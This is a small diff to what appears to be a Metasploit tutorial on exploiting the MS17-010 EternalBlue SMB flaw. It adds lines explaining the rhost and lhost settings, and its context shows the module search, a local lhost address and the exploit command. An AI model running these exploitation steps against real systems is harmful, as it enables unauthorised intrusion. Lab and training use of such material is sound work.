@@ -59,6 +59,9 @@ msf auxiliary(smb_ms17_010) > exploit
 ### Exploit Results
 
 > From the results you will see that the system is vulnerable to the scan
+>
+> * **rhost** is the target system IP address
+> * **lhost** is your system IP address
 
 ```
 search smb_ms17_010_eternalblue
@@ -73,10 +76,6 @@ msf exploit(ms17_010_eternalblue) > set lhost 192.168.1.115
 
 msf exploit(ms17_010_eternalblue) > exploit
 ```
-
-
-
-
 
 
 
